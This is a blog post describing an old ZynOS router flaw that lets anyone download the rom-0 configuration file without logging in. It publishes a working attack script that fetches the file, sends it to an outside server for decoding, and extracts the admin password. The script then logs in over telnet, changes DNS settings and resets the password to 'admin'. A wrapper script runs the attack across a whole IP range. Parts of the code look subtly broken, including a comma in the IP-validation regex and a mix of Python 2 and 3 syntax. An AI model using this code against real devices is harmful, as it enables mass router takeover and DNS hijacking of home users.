<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>zynOS rom-0 fetching</title>
    
<head>
    
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>zynOS rom-0 fetching</title>
<meta name="description" content="">


<meta property="og:title" content="zynOS rom-0 fetching">
<meta property="og:description" content="">

    
    



<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="zynOS rom-0 fetching">
<meta name="twitter:description" content="">

    
    


    <base href="/">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/custom.css">
</head>
    <link rel="stylesheet" href="/css/custom.css">
</head>
<body>
    
<div id="content-area" data-page-type="single">
    <article id="post">
        <header>
            <h1 id="post-title">zynOS rom-0 fetching</h1>
            <br>
            <time datetime="2024-01-10T11:32:59-05:00" class="post-date-time">
                Jan 10, 2024
            </time>
        </header>
        <div id="post-content">
            <p>i was poking around old vulnerabilities, that specifically affected home networks and i found this (now patched) exploitable vulnerability affecting zynOS routers. the vulnerability allows an attacker to download the router&rsquo;s configuration (ROM-0 file) without any type of authentication. this file could then be later decompressed to expose the router&rsquo;s admin password, wifi password, etc.</p>
<p><a href="https://github.com/bilals12/zyn-rom0">the program</a> i wrote attempts to connect to a valid host to download said ROM-0 file, extracts specific data from it (using regex), then logs back into the same host via telnet to change DNS settings, set a system password, and log out. it&rsquo;s a pretty simple program, and its use-case is probably limited nowadays but it was a fun exercise nonetheless. as always, it&rsquo;s for educational purposes only!</p>
<p>the main script can be broken down into 8 steps:</p>
<ol>
<li>
<p><strong>set default socket timeout</strong>: <code>socket.setdefaulttimeout(4)</code> sets a default timeout for new socket objects to 4 seconds. this affects all subsequent socket operations.</p>
</li>
<li>
<p><strong>registering openers</strong>: <code>register_openers()</code> initializes and configures libraries to handle multipart/form-data uploads.</p>
</li>
<li>
<p><strong>file handling</strong>: the script attempts to remove a file named &ldquo;rom-0&rdquo; from the current directory, as a cleanup step from previous runs.</p>
</li>
<li>
<p><strong>downloading file</strong>: the script constructs a URL using a command-line argument (<code>sys.argv[1]</code>) and downloads a file named &ldquo;rom-0&rdquo; from this URL. requires a valid host to be passed as an argument!</p>
</li>
<li>
<p><strong>uploading the file</strong>: it then uploads this file to a specific URL (<code>http://198.61.167.113/zynos/decoded.php</code>). this server is intended to process/analyze the uploaded file.</p>
</li>
<li>
<p><strong>extracting information</strong>: the script uses regex to extract certain data from the response received after uploading the file.</p>
</li>
<li>
<p><strong>establishing telnet connection</strong>: it attempts to establish a telnet connection to the same host from which the &ldquo;rom-0&rdquo; file was downloaded.</p>
</li>
<li>
<p><strong>sending commands via telnet</strong>: the extracted data (hopefully a password) is used to login via telnet. the script then executes several commands on the remote host.</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib2
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> telnetlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> poster.encode <span style="color:#f92672">import</span> multipart_encode
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> poster.streaminghttp <span style="color:#f92672">import</span> register_openers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># set default timeout for socket ops to avoid indefinite hang</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># improves reliability of network ops</span>
</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>setdefaulttimeout(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># register openers for multipart/form-data upload</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># required for handling file uploads</span>
</span></span><span style="display:flex;"><span>register_openers()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># try to remove file &#34;rom-0&#34; in current directory (if it exists)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cleanup step to ensure script always works with latest data</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#34;rom-0&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pass</span> <span style="color:#75715e">#ignores error if file doesn&#39;t exist</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main script</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># read host IP from command line arg</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;usage: python script.py [host_ip]&#34;</span>)
</span></span><span style="display:flex;"><span>		sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	host <span style="color:#f92672">=</span> str(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># validate host IP format</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^\d{1,3}(\,\d{1,3})</span><span style="color:#e6db74">{3}</span><span style="color:#e6db74">$&#39;</span>, host):
</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;[!] invalid IP address format [!]&#34;</span>)
</span></span><span style="display:flex;"><span>		sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># download &#34;rom-0&#34; from provided host</span>
</span></span><span style="display:flex;"><span>	urllib<span style="color:#f92672">.</span>urlretrieve(<span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rom-0&#34;</span>, <span style="color:#e6db74">&#34;rom-0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># using context manager for file ops to ensure proper closure of the file</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;rom-0&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		datagen, headers <span style="color:#f92672">=</span> multipart_encode({<span style="color:#e6db74">&#34;uploadedfile&#34;</span>: f})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># send POST request with file to specific server for processing</span>
</span></span><span style="display:flex;"><span>		request <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>Request(<span style="color:#e6db74">&#34;http://198.61.167.113/zynos/decoded.php&#34;</span>, datagen, headers)
</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(request)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># extract specific data (password) using regex</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;rows=10&gt;(.*)&#39;</span>, response)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
</span></span><span style="display:flex;"><span>			found_password <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">&#34;[!] password not found in response [!]&#34;</span>)
</span></span><span style="display:flex;"><span>			sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># establish telnet connection to target host</span>
</span></span><span style="display:flex;"><span>	tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet(host, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>	tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;Password: &#34;</span>)
</span></span><span style="display:flex;"><span>	tn<span style="color:#f92672">.</span>write(found_password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># executing commands on target host</span>
</span></span><span style="display:flex;"><span>	tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;set lan dhcpdns 8.8.8.8</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;sys password admin</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	print(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; [^-^] success! [^-^]&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># exit telnet sesh</span>
</span></span><span style="display:flex;"><span>	tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># errors</span>
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] an error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74"> [!]&#34;</span>)
</span></span><span style="display:flex;"><span>	print(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; [:(] offline/inaccessible [:(]&#34;</span>)
</span></span></code></pre></div><p>running <code>attack.py</code> simply peforms the actions of the main script over a specified target range.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> netaddr <span style="color:#f92672">import</span> IPNetwork
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># define range of IP addresses to iterate over</span>
</span></span><span style="display:flex;"><span>ip_range <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;41.108.48.1/24&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># iterate over each IP in the range</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ip <span style="color:#f92672">in</span> IPNetwork(ip_range):
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># execute script.py</span>
</span></span><span style="display:flex;"><span>	command <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;python&#34;</span>, <span style="color:#e6db74">&#34;script.py&#34;</span>, str(ip)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># execute command using subprocess</span>
</span></span><span style="display:flex;"><span>	subprocess<span style="color:#f92672">.</span>run(command)
</span></span></code></pre></div>
        </div>
    </article>
</div>

    
     <script src="/p5/p5.min.js"></script>
     <script src="/js/genart.js"></script>
     <script src="/js/main.js"></script>
</body>
</html>